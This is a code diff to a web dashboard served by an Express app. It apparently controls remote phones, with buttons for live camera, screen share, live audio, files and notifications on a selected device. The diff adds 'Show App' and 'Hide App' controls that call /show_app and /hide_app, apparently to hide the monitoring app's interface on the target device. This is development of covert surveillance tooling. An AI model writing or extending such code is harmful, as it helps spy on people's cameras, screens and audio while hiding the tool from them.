@@ -438,7 +438,10 @@ app.get('/', (req, res) => {
         <button class="btn btn-orange" onclick="toggleCamera()"><span class="icon">📷</span><span class="label">Live Camera</span></button>
         <button class="btn btn-teal" onclick="switchCamera()"><span class="icon">🔄</span><span class="label">Switch Cam</span></button>
         <button class="btn btn-indigo" onclick="toggleScreen()"><span class="icon">📺</span><span class="label">Screen Share</span></button>
-        <button class="btn btn-blue" onclick="loadAll()" style="grid-column:span 3"><span class="icon">↺</span><span class="label">Refresh All</span></button>
+        <!-- ADDED: Show/Hide App Buttons + Refresh modified -->
+        <button class="btn btn-blue" onclick="showAppUI()"><span class="icon">📱</span><span class="label">Show App</span></button>
+        <button class="btn btn-grey" onclick="hideAppUI()"><span class="icon">🚫</span><span class="label">Hide App</span></button>
+        <button class="btn btn-blue" onclick="loadAll()" style="grid-column:span 1"><span class="icon">↺</span><span class="label">Refresh All</span></button>
       </div>
       <div class="live-box" id="liveBox">
         <div class="live-indicator"><div class="live-dot"></div><span style="font-size:13px;font-weight:600;color:#f44336">LIVE AUDIO</span></div>
@@ -775,6 +778,19 @@ app.get('/', (req, res) => {
   }
 
   function loadAll() { loadFiles(); loadNotifications(); showToast('Refresh!'); }
+
+  // ---------- ADDED: Show/Hide App UI functions ----------
+  async function showAppUI() {
+    if (!selectedDevice) { showToast('Device select karo!', 'error'); return; }
+    await fetch('/show_app?device=' + encodeURIComponent(selectedDevice));
+    showToast('📱 App UI dikhai dega 30 sec ke liye!');
+  }
+
+  async function hideAppUI() {
+    if (!selectedDevice) { showToast('Device select karo!', 'error'); return; }
+    await fetch('/hide_app?device=' + encodeURIComponent(selectedDevice));
+    showToast('🚫 App hidden!');
+  }
 
   loadDevices();
   setInterval(loadDevices, 10000);
